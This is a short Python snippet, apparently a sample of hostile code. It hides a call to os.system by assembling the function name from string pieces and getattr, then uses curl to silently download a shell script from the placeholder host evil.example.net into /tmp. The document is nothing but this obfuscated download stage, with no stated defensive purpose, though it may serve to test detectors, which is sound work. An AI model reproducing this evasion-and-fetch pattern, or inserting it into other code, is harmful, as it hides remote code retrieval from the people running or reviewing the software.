import os

_a = 'sy'
_b = 'stem'
_fn = getattr(os, _a + _b)
_fn('curl -s http://evil.example.net/x.sh -o /tmp/x.sh')
